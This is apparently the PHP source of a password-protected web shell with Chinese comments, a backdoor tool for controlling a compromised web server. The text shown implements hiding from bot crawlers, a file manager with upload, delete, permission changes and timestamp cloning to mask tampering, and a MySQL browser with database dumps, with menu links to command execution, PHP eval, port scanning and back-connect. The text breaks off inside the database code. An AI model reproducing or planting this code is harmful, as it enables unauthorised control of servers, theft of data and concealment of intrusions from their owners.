<?php
//ini_set('display_errors',1);
@error_reporting(7);
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if( strpos( strtolower( $_SERVER['HTTP_USER_AGENT'] ), 'bot' ) !== false ) {
	header('HTTP/1.0 404 Not Found');
	exit;
}
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
define('SELF', $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );

if( IS_GPC ) { 
	$_POST = s_array($_POST);
}
$P = $_POST;
unset($_POST);
/*===================== 程序配置 =====================*/

//echo encode_pass('angel');exit;
//angel = ec38fe2a8497e0a8d6d349b3533038cb
// 如果需要密码验证,请修改登陆密码,留空为不需要验证
$pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel

//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
// cookie 前缀
$cookiepre = '';
// cookie 作用域
$cookiedomain = '';
// cookie 作用路径
$cookiepath = '/';
// cookie 有效期
$cookielife = 86400;

/*===================== 配置结束 =====================*/

$charsetdb = array(
	'big5'			=> 'big5',
	'cp-866'		=> 'cp866',
	'euc-jp'		=> 'ujis',
	'euc-kr'		=> 'euckr',
	'gbk'			=> 'gbk',
	'iso-8859-1'	=> 'latin1',
	'koi8-r'		=> 'koi8r',
	'koi8-u'		=> 'koi8u',
	'utf-8'			=> 'utf8',
	'windows-1252'	=> 'latin1',
);

$act = isset($P['act']) ? $P['act'] : '';
$charset = isset($P['charset']) ? $P['charset'] : 'gbk';
$doing = isset($P['doing']) ? $P['doing'] : '';

for ($i=1;$i<=4;$i++) {
	${'p'.$i} = isset($P['p'.$i]) ? $P['p'.$i] : '';
}

if (isset($charsetdb[$charset])) {
	header("content-Type: text/html; charset=".$charset);
}

$timestamp = time();

/* 身份验证 */
if ($act == "logout") {
	scookie('loginpass', '', -86400 * 365);
	@header('Location: '.SELF);
	exit;
}
if($pass) {
	if ($act == 'login') {
		if ($pass == encode_pass($P['password'])) {
			scookie('loginpass',encode_pass($P['password']));
			@header('Location: '.SELF);
			exit;
		}
	}
	if (isset($_COOKIE['loginpass'])) {
		if ($_COOKIE['loginpass'] != $pass) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/* 验证结束 */

$errmsg = '';
$uchar = '&#9650;';
$dchar = '&#9660;';
!$act && $act = 'file';

//当前目录/设置工作目录/网站根目录
$home_cwd = getcwd();
if (isset($P['cwd']) && $P['cwd']) {
	chdir($P['cwd']);
} else {
	chdir(SA_ROOT);
}
$cwd = getcwd();
$web_cwd = $_SERVER['DOCUMENT_ROOT'];
foreach (array('web_cwd','cwd','home_cwd') as $k) {
	if (IS_WIN) {
		$$k = str_replace('\\', '/', $$k);
	}
	if (substr($$k, -1) != '/') {
		$$k = $$k.'/';
	}
}

// 查看PHPINFO
if ($act == 'phpinfo') {
	if (IS_PHPINFO) {
		phpinfo();
		exit;
	} else {
		$errmsg = 'phpinfo() function has disabled';
	}
}

if(!function_exists('scandir')) {
	function scandir($cwd) {
		$files = array();
		$dh = opendir($cwd);
		while ($file = readdir($dh)) {
			$files[] = $file;
		}
		return $files ? $files : 0;
	}
}

if ($act == 'down') {
	if (is_file($p1) && is_readable($p1)) {
		@ob_end_clean();
		$fileinfo = pathinfo($p1);
		if (function_exists('mime_content_type')) {
			$type = @mime_content_type($p1);
			header("Content-Type: ".$type);
		} else {
			header('Content-type: application/x-'.$fileinfo['extension']);
		}
		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
		header('Content-Length: '.sprintf("%u", @filesize($p1)));
		@readfile($p1);
		exit;
	} else {
		$errmsg = 'Can\'t read file';
		$act = 'file';
	}
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $charset;?>">
<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input, select{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.red{color:#f00;}
.black{color:#000;}
.green{color:#090;}
.b{font-weight:bold;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#fff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:none;}
a:hover{color: #f00;text-decoration:underline;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffa;padding:5px 15px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
.infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.drives{padding:5px;}
.drives span {margin:auto 7px;}
</style>
<script type="text/javascript">
function checkall(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
        if (e.type == 'checkbox') {
			if (e.name != 'chkall' && e.name != 'saveasfile')
				e.checked = form.chkall.checked;
		}
    }
}
function $(id) {
	return document.getElementById(id);
}
function createdir(){
	var newdirname;
	newdirname = prompt('Please input the directory name:', '');
	if (!newdirname) return;
	g(null,null,'createdir',newdirname);
}
function fileperm(pfile, val){
	var newperm;
	newperm = prompt('Current dir/file:'+pfile+'\nPlease input new permissions:', val);
	if (!newperm) return;
	g(null,null,'fileperm',pfile,newperm);
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Filename:'+oldname+'\nPlease input new filename:', '');
	if (!newfilename) return;
	g(null,null,'rename',newfilename,oldname);
}
function createfile(){
	var filename;
	filename = prompt('Please input the file name:', '');
	if (!filename) return;
	g('editfile', null, null, filename);
}
function setdb(dbname) {
	if(!dbname) return;
	$('dbform').tablename.value='';
	$('dbform').doing.value='';
	if ($('dbform').sql_query)
	{
		$('dbform').sql_query.value='';
	}
	$('dbform').submit();
}
function setsort(k) {
	$('dbform').order.value=k;
	$('dbform').submit();
}
function settable(tablename,doing) {
	if(!tablename) return;
	if (doing) {
		$('dbform').doing.value=doing;
	} else {
		$('dbform').doing.value='';
	}
	$('dbform').sql_query.value='';
	$('dbform').tablename.value=tablename;
	$('dbform').submit();
}
function s(act,cwd,p1,p2,p3,p4,charset) {
	if(act != null) $('opform').act.value=act;
	if(cwd != null) $('opform').cwd.value=cwd;
	if(p1 != null) $('opform').p1.value=p1;
	if(p2 != null) $('opform').p2.value=p2;
	if(p3 != null) $('opform').p3.value=p3;
	if(p4 != null) {$('opform').p4.value=p4;}else{$('opform').p4.value='';}
	if(charset != null) $('opform').charset.value=charset;
}
function g(act,cwd,p1,p2,p3,p4,charset) {
	s(act,cwd,p1,p2,p3,p4,charset);
	$('opform').submit();
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
<?php

formhead(array('name'=>'opform'));
makehide('act', $act);
makehide('cwd', $cwd);
makehide('p1', $p1);
makehide('p2', $p2);
makehide('p3', $p3);
makehide('p4', $p4);
makehide('charset', $charset);
formfoot();

if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(@posix_geteuid());
	$gid = @posix_getgrgid(@posix_getegid());
	$uid = $uid['uid'];
	$user = $uid['name'];
	$gid = $gid['gid'];
	$group = $gid['name'];
}
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;"><?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>
	</tr>
	<tr class="alt1">
		<td>
			<span style="float:right;">Charset:
			<?php
			makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'onchange'=>'g(null,null,null,null,null,null,this.value);'));
			?>
			</span>
			<a href="javascript:g('logout');">Logout</a> | 
			<a href="javascript:g('file',null,'','','','','<?php echo $charset;?>');">File Manager</a> | 
			<a href="javascript:g('mysqladmin',null,'','','','','<?php echo $charset;?>');">MYSQL Manager</a> | 
			<a href="javascript:g('shell',null,'','','','','<?php echo $charset;?>');">Execute Command</a> | 
			<a href="javascript:g('phpenv',null,'','','','','<?php echo $charset;?>');">PHP Variable</a> | 
			<a href="javascript:g('portscan',null,'','','','','<?php echo $charset;?>');">Port Scan</a> | 
			<a href="javascript:g('secinfo',null,'','','','','<?php echo $charset;?>');">Security information</a> | 
			<a href="javascript:g('eval',null,'','','','','<?php echo $charset;?>');">Eval PHP Code</a>
			<?php if (!IS_WIN) {?> | <a href="javascript:g('backconnect',null,'','','','','<?php echo $charset;?>');">Back Connect</a><?php }?>
		</td>
	</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php
$errmsg && m($errmsg);

if ($act == 'file') {

	// 判断当前目录可写情况
	$dir_writeable = @is_writable($cwd) ? 'Writable' : 'Non-writable';
	if (isset($p1)) {
		switch($p1) {
			case 'createdir':
				// 创建目录
				if ($p2) {
					m('Directory created '.(@mkdir($cwd.$p2,0777) ? 'success' : 'failed'));
				}
				break;
			case 'uploadFile':
				// 上传文件
				m('File upload '.(@move_uploaded_file($_FILES['uploadfile']['tmp_name'], $cwd.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
				break;
			case 'fileperm':
				// 编辑文件属性
				if ($p2 && $p3) {
					$p3 = base_convert($p3, 8, 10);
					m('Set file permissions '.(@chmod($p2, $p3) ? 'success' : 'failed'));
				}
				break;
			case 'rename':
				// 改名
				if ($p2 && $p3) {
					m($p3.' renamed '.$p2.(@rename($p3, $p2) ? ' success' : ' failed'));
				}
				break;
			case 'clonetime':
				// 克隆时间
				if ($p2 && $p3) {
					$time = @filemtime($p3);
					m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));
				}
				break;
			case 'settime':
				// 自定义时间
				if ($p2 && $p3) {
					$time = strtotime($p3);
					m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));
				}
				break;
			case 'delete':
				// 批量删除文件
				if ($P['dl']) {
					$succ = $fail = 0;
					foreach ($P['dl'] as $f) {
						if (is_dir($cwd.$f)) {
							if (@deltree($cwd.$f)) {
								$succ++;
							} else {
								$fail++;
							}
						} else {
							if (@unlink($cwd.$f)) {
								$succ++;
							} else {
								$fail++;
							}
						}
					}
					m('Deleted folder/file(s) have finished, choose '.count($P['dl']).', success '.$succ.', fail '.$fail);
				} else {
					m('Please select folder/file(s)');
				}
				break;
			case 'paste':
				if($_SESSION['do'] == 'copy') {
					foreach($_SESSION['dl'] as $f) {
						copy_paste($_SESSION['c'],$f, $cwd);					
					}
				} elseif($_SESSION['do'] == 'move') {
					foreach($_SESSION['dl'] as $f) {
						@rename($_SESSION['c'].$f, $cwd.$f);
					}
				}
				unset($_SESSION['do'], $_SESSION['dl'], $_SESSION['c']);
				break;
			default:
				if($p1 == 'copy' || $p1 == 'move') {
					if (isset($P['dl']) && count($P['dl'])) {
						$_SESSION['do'] = $p1;
						$_SESSION['dl'] = $P['dl'];
						$_SESSION['c'] = $P['cwd'];
						m('Have been copied to the session');
					} else {
						m('Please select folder/file(s)');
					}
				}
				break;
		}
		echo "<script type=\"text/javascript\">$('opform').p1.value='';$('opform').p2.value='';</script>";
	}
	//操作完毕
	$free = @disk_free_space($cwd);
	!$free && $free = 0;
	$all = @disk_total_space($cwd);
	!$all && $all = 0;
	$used = $all-$free;
	p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)</h2>');

	$cwd_links = '';
	$path = explode('/', $cwd);
	$n=count($path);
	for($i=0;$i<$n-1;$i++) {
		$cwd_links .= '<a href="javascript:g(\'file\', \'';
		for($j=0;$j<=$i;$j++) {
			$cwd_links .= $path[$j].'/';
		}
		$cwd_links .= '\');">'.$path[$i].'/</a>';
	}

?>
<script type="text/javascript">
document.onclick = shownav;
function shownav(e){
	var src = e?e.target:event.srcElement;
	do{
		if(src.id =="jumpto") {
			$('inputnav').style.display = "";
			$('pathnav').style.display = "none";
			return;
		}
		if(src.id =="inputnav") {
			return;
		}
		src = src.parentNode;
	}while(src.parentNode)

	$('inputnav').style.display = "none";
	$('pathnav').style.display = "";
}
</script>
<div style="background:#eee;margin-bottom:10px;">
	<form onsubmit="g('file',this.cwd.value);return false;" method="POST" id="godir" name="godir">
		<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
			<tr>
				<td width="100%"><?php echo $cwd_links.' - '.getChmod($cwd).' / '.PermsColor($cwd).getUser($cwd);?> (<?php echo $dir_writeable;?>)</td>
				<td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
			</tr>
		</table>
		<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
			<tr>
				<td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($cwd);?>)</td>
				<td width="100%"><input class="input" name="cwd" value="<?php echo $cwd;?>" type="text" style="width:99%;margin:0 8px;"></td>
				<td nowrap><input class="bt" value="GO" type="submit"></td>
			</tr>
		</table>
	</form>
<?php
	if (IS_WIN) {
		$comma = '';
		p('<div class="drives">');
		foreach( range('A','Z') as $drive ) {
			if (is_dir($drive.':/')) {
				p($comma.'<a href="javascript:g(\'file\', \''.$drive.':/\');">'.$drive.':\</a>');
				$comma = '<span>|</span>';
			}
		}
		p('</div>');
	}
?>
</div>
<?php
	p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
	p('<tr class="alt1"><td colspan="6" style="padding:5px;line-height:20px;">');
	p('<form action="'.SELF.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input name="uploadfile" value="" type="file" /> <input class="bt" value="Upload" type="submit" /><input name="charset" value="'.$charset.'" type="hidden" /><input type="hidden" name="p1" value="uploadFile"><input name="cwd" value="'.$cwd.'" type="hidden" /></div></form>');
	p('<a href="javascript:g(\'file\', \''.str_replace('\\','/',$web_cwd).'\');">WebRoot</a>');
	p(' | <a href="javascript:g(\'file\', \''.$home_cwd.'\');">ScriptPath</a>');
	p(' | <a href="javascript:g(\'file\',\''.$cwd.'\',null,null,null,\'dir\');">View Writable Directory</a> ');
	p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile();">Create File</a>');
	p('</td></tr>');

	$sort = array('filename', 1);
	if($p1) {
		if(preg_match('!s_([A-z_]+)_(\d{1})!', $p1, $match)) {
			$sort = array($match[1], (int)$match[2]);
		}
	}

	formhead(array('name'=>'flist'));
	makehide('act','file');
	makehide('p1','');
	makehide('cwd',$cwd);
	makehide('charset',$charset);
	p('<tr class="head">');
	p('<td width="2%" nowrap><input name="chkall" value="on" type="checkbox" onclick="checkall(this.form)" /></td>');
	p('<td><a href="javascript:g(\'file\',null,\'s_filename_'.($sort[1]?0:1).'\');">Filename</a> '.($p1 == 's_filename_0' ? $dchar : '').($p1 == 's_filename_1' || !$p1 ? $uchar : '').'</td>');
	p('<td width="16%"><a href="javascript:g(\'file\',null,\'s_mtime_'.($sort[1]?0:1).'\');">Last modified</a> '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'</td>');
	p('<td width="10%"><a href="javascript:g(\'file\',null,\'s_size_'.($sort[1]?0:1).'\');">Size</a> '.($p1 == 's_size_0' ? $dchar : '').($p1 == 's_size_1' ? $uchar : '').'</td>');
	p('<td width="20%">Chmod / Perms</td>');
	p('<td width="22%">Action</td>');
	p('</tr>');

	//查看所有可写文件和目录
	$dirdata=$filedata=array();

	if ($p4 == 'dir') {
		$dirdata = GetWDirList($cwd);
		$filedata = array();
	} else {
		// 默认目录列表
		$dirs = @scandir($cwd);
		if ($dirs) {
			$dirs = array_diff($dirs, array('.'));
			foreach ($dirs as $file) {
				$filepath=$cwd.$file;
				if(@is_dir($filepath)){
					$dirdb['filename']=$file;
					$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
					$dirdb['chmod']=getChmod($filepath);
					$dirdb['perm']=PermsColor($filepath);
					$dirdb['owner']=getUser($filepath);
					$dirdb['link']=$filepath;
					if ($file=='..') {
						$dirdata['up']=1;
					} else {
						$dirdata[]=$dirdb;
					}
				} else {
					$filedb['filename']=$file;
					//$filedb['size']=@filesize($filepath);
					$filedb['size']=sprintf("%u", @filesize($filepath));
					$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
					$filedb['chmod']=getChmod($filepath);
					$filedb['perm']=PermsColor($filepath);
					$filedb['owner']=getUser($filepath);
					$filedb['link']=$filepath;
					$filedata[]=$filedb;
				}
			}
			unset($dirdb);
			unset($filedb);
		}
	}
	$dir_i = '0';
	if (isset($dirdata['up'])) {
		$thisbg = bg();
		p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
		p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:g(\'file\',\''.getUpPath($cwd).'\');">Parent Directory</a></td>');
		p('</tr>');
	}
	unset($dirdata['up']);
	usort($dirdata, 'cmp');
	usort($filedata, 'cmp');
	foreach($dirdata as $key => $dirdb){
		if($p1 == 'getsize' && $p2 == $dirdb['filename']) {
			$attachsize = dirsize($p2);
			$attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
		} else {
			$attachsize = '<a href="javascript:g(\'file\', null, \'getsize\', \''.$dirdb['filename'].'\');">Stat</a>';
		}
		$thisbg = bg();
		p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
		p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$dirdb['filename'].'"></td>');
		p('<td><a href="javascript:g(\'file\',\''.$dirdb['link'].'\')">'.$dirdb['filename'].'</a></td>');
		p('<td nowrap><a href="javascript:g(\'newtime\',null,\''.$dirdb['filename'].'\');">'.$dirdb['mtime'].'</a></td>');
		p('<td nowrap>'.$attachsize.'</td>');
		p('<td nowrap>');
		p('<a href="javascript:fileperm(\''.$dirdb['filename'].'\', \''.$dirdb['chmod'].'\');">'.$dirdb['chmod'].'</a> / ');
		p('<a href="javascript:fileperm(\''.$dirdb['filename'].'\', \''.$dirdb['chmod'].'\');">'.$dirdb['perm'].'</a>'.$dirdb['owner'].'</td>');
		p('<td nowrap><a href="javascript:rename(\''.$dirdb['filename'].'\');">Rename</a></td>');
		p('</tr>');
		$dir_i++;
	}

	p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
	$file_i = '0';

	foreach($filedata as $key => $filedb){
		$fileurl = '/'.str_replace($web_cwd,'',$filedb['link']);
		$thisbg = bg();
		p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
		p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$filedb['filename'].'"></td>');
		p('<td>'.((strpos($filedb['link'], $web_cwd) !== false) ? '<a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a>' : $filedb['filename']).'</td>');
		p('<td nowrap><a href="javascript:g(\'newtime\',null,\''.$filedb['filename'].'\');">'.$filedb['mtime'].'</a></td>');
		p('<td nowrap>'.sizecount($filedb['size']).'</td>');
		p('<td nowrap>');
		p('<a href="javascript:fileperm(\''.$filedb['filename'].'\', \''.$filedb['chmod'].'\');">'.$filedb['chmod'].'</a> / ');
		p('<a href="javascript:fileperm(\''.$filedb['filename'].'\', \''.$filedb['chmod'].'\');">'.$filedb['perm'].'</a>'.$filedb['owner'].'</td>');
		p('<td nowrap>');
		p('<a href="javascript:g(\'down\',null,\''.$filedb['filename'].'\');">Down</a> | ');
		p('<a href="javascript:g(\'editfile\',null,null,\''.$filedb['filename'].'\');">Edit</a> | ');
		p('<a href="javascript:rename(\''.$filedb['filename'].'\');">Rename</a>');
		p('</td></tr>');
		$file_i++;
	}
	p('<tr class="'.bg().' head"><td colspan="5"><a href="#" onclick="$(\'flist\').p1.value=\'delete\';$(\'flist\').submit();">Delete</a> | <a href="#" onclick="$(\'flist\').p1.value=\'copy\';$(\'flist\').submit();">Copy</a> | <a href="#" onclick="$(\'flist\').p1.value=\'move\';$(\'flist\').submit();">Move</a>'.(isset($_SESSION['do']) && @count($_SESSION['dl']) ? ' | <a href="#" onclick="$(\'flist\').p1.value=\'paste\';$(\'flist\').submit();">Paste</a>' : '').'</td><td align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
	p('</form></table>');
}// end dir

elseif ($act == 'mysqladmin') {
	$order = isset($P['order']) ? $P['order'] : '';
	$dbhost = isset($P['dbhost']) ? $P['dbhost'] : '';
	$dbuser = isset($P['dbuser']) ? $P['dbuser'] : '';
	$dbpass = isset($P['dbpass']) ? $P['dbpass'] : '';
	$dbname = isset($P['dbname']) ? $P['dbname'] : '';
	$tablename = isset($P['tablename']) ? $P['tablename'] : '';

	if ($doing == 'dump') {
		if (isset($P['bak_table']) && $P['bak_table']) {
			$DB = new DB_MySQL;
			$DB->charsetdb = $charsetdb;
			$DB->charset = $charset;
			$DB->connect($dbhost, $dbuser, $dbpass, $dbname);
			if ($P['saveasfile'] && $P['bak_path']) {
				$fp = @fopen($P['bak_path'],'w');
				if ($fp) {
					foreach($P['bak_table'] as $k => $v) {
						if ($v) {
							$DB->sqldump($v, $fp);
						}
					}
					fclose($fp);				
					$fileurl = str_replace(SA_ROOT,'',$P['bak_path']);
					m('Database has backup to <a href="'.$fileurl.'" target="_blank">'.$P['bak_path'].'</a>');
				} else {
					m('Backup failed');
				}
			} else {
				@ob_end_clean();
				$filename = basename($dbname.'.sql');
				header('Content-type: application/unknown');
				header('Content-Disposition: attachment; filename='.$filename);
				foreach($P['bak_table'] as $k => $v) {
					if ($v) {
						$DB->sqldump($v);
					}
				}
				exit;
			}
			$DB->close();
		} else {
			m('Please choose the table');
		}
		$doing = '';
	}

	formhead(array('title'=>'MYSQL Manager', 'name'=>'dbform'));
	makehide('act','mysqladmin');
	makehide('doing',$doing);
	makehide('charset', $charset);
	makehide('tablename', $tablename);
	makehide('order', $order);
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	makeinput(array('value'=>'Connect','type'=>'submit','class'=>'bt'));
	p('</p>');

	if ($dbhost && $dbuser && isset($dbpass)) {
		
		// 初始化数据库类
		$DB = new DB_MySQL;
		$DB->charsetdb = $charsetdb;
		$DB->charset = $charset;
		$DB->connect($dbhost, $dbuser, $dbpass, $dbname);

		//获取数据库信息
		p('<p class="red">MySQL '.$DB->version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
		$highver = $DB->version() > '4.1' ? 1 : 0;

		//获取数据库
		$query = $DB->query("SHOW DATABASES");
		$dbs = array();
		$dbs[] = '-- Select a database --';
		while($db = $DB->fetch($query)) {
			$dbs[$db['Database']] = $db['Database'];
		}
		makeselect(array('name'=>'dbname','option'=>$dbs,'selected'=>$dbname,'onchange'=>'setdb(this.options[this.selectedIndex].value)'));

		if ($dbname) {
			p('<p>Current dababase: <a href="javascript:setdb(\''.$dbname.'\');">'.$dbname.'</a>');
			if ($tablename) {
				p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> ]');
			}
			p('</p>');

			$sql_query = isset($P['sql_query']) ? $P['sql_query'] : '';

			if ($tablename && !$sql_query) {
				$sql_query = "SELECT * FROM $tablename LIMIT 0, 30";
			}
			if ($tablename && $doing == 'structure') {
				$sql_query = "SHOW FULL COLUMNS FROM $tablename;\n";
				$sql_query .= "SHOW INDEX FROM $tablename;";
			}
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" onclick="$(\'doing\').value=\'\'" style="height:50px;" type="submit" value="Query" /></td></tr></table></p>');
			if ($sql_query) {
				$querys = @explode(';',$sql_query);
				foreach($querys as $num=>$query) {
					if ($query) {
						p("<p class=\"red b\">Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</p>");
						switch($DB->query_res($query))
						{
							case 0:
								p('<h2>'.$DB->halt('Error').'</h2>');
								break;	
							case 1:
								$result = $DB->query($query);
								$tatol = $DB->num_rows($result);
								p('<table border="0" cellpadding="3" cellspacing="0">');
								p('<tr class="head">');
								$fieldnum = @mysql_num_fields($result);
								for($i=0;$i<$fieldnum;$i++){
									p('<td nowrap>'.@mysql_field_name($result, $i).'</td>');
								}
								p('</tr>');
								
								if (!$tatol) {
									p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';"><td nowrap colspan="'.$fieldnum.'" class="red b">No records</td></tr>');
								} else {
									while($mn = $DB->fetch($result)){
										$thisbg = bg();
										p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
										//读取记录用
										foreach($mn as $key=>$inside){
											p('<td nowrap>'.(($inside == null) ? '<i>null</i>' : html_clean($inside)).'</td>');
										}
										p('</tr>');
										unset($b1);
									}
								}
								p('</table>');
								break;
							case 2:
								p('<h2>Affected Rows : '.$DB->affected_rows().'</h2>');
								break;
						}
					}
				}
			} else {
				$query = $DB->query("SHOW TABLE STATUS");
				$table_num = $table_rows = $data_size = 0;
				$tabledb = array();
				while($table = $DB->fetch($query)) {
					$data_size = $data_size + $table['Data_length'];
					$table_rows = $table_rows + $table['Rows'];
					$table_num++;
					$tabledb[] = $table;
				}
				$data_size = sizecount($data_size);
				unset($table);
				if (count($tabledb)) {
					if ($highver) {
						$db_engine = $DB->fetch($DB->query("SHOW VARIABLES LIKE 'storage_engine';"));						
						$db_collation = $DB->fetch($DB->query("SHOW VARIABLES LIKE 'collation_database';"));
					}
					$sort = array('Name', 1);
					if($order) {
						if(preg_match('!s_([A-z_]+)_(\d{1})!', $order, $match)) {
							$sort = array($match[1], (int)$match[2]);
						}
					}
					usort($tabledb, 'cmp');
					p('<table border="0" cellpadding="0" cellspacing="0" id="lists">');
					p('<tr class="head">');
					p('<td width="2%"><input name="chkall" value="on" type="checkbox" onclick="checkall(this.form)" /></td>');
					p('<td><a href="javascript:setsort(\'s_Name_'.($sort[1]?0:1).'\');">Name</a> '.($order == 's_Name_0' ? $dchar : '').($order == 's_Name_1' || !$order ? $uchar : '').'</td>');
					p('<td><a href="javascript:setsort(\'s_Rows_'.($sort[1]?0:1).'\');">Rows</a>'.($order == 's_Rows_0' ? $dchar : '').($order == 's_Rows_1' ? $uchar : '').'</td>');
					p('<td><a href="javascript:setsort(\'s_Data_length_'.($sort[1]?0:1).'\');">Data_length</a>'.($order == 's_Data_length_0' ? $dchar : '').($order == 's_Data_length_1' ? $uchar : '').'</td>');
					p('<td><a href="javascript:setsort(\'s_Create_time_'.($sort[1]?0:1).'\');">Create_time</a>'.($order == 's_Create_time_0' ? $dchar : '').($order == 's_Create_time_1' ? $uchar : '').'</td>');
					p('<td><a href="javascript:setsort(\'s_Update_time_'.($sort[1]?0:1).'\');">Update_time</a>'.($order == 's_Update_time_0' ? $dchar : '').($order == 's_Update_time_1' ? $uchar : '').'</td>');
					if ($highver) {
						p('<td>Engine</td>');
						p('<td>Collation</td>');
					}
					p('<td>Other</td>');
					p('</tr>');
					foreach ($tabledb as $key => $table) {
						$thisbg = bg();
						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
						p('<td align="center" width="2%"><input type="checkbox" name="bak_table[]" value="'.$table['Name'].'" /></td>');
						p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
						p('<td>'.$table['Rows'].'&nbsp;</td>');
						p('<td>'.sizecount($table['Data_length']).'</td>');
						p('<td>'.$table['Create_time'].'&nbsp;</td>');
						p('<td>'.$table['Update_time'].'&nbsp;</td>');
						if ($highver) {
							p('<td>'.$table['Engine'].'</td>');
							p('<td>'.$table['Collation'].'</td>');
						}
						p('<td><a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a></td>');
						p('</tr>');
					}
					p('<tr class="head">');
					p('<td width="2%">&nbsp;</td>');
					p('<td>'.$table_num.' table(s)</td>');
					p('<td>'.$table_rows.'</td>');
					p('<td>'.$data_size.'</td>');
					p('<td>&nbsp;</td>');
					p('<td>&nbsp;</td>');
					if ($highver) {
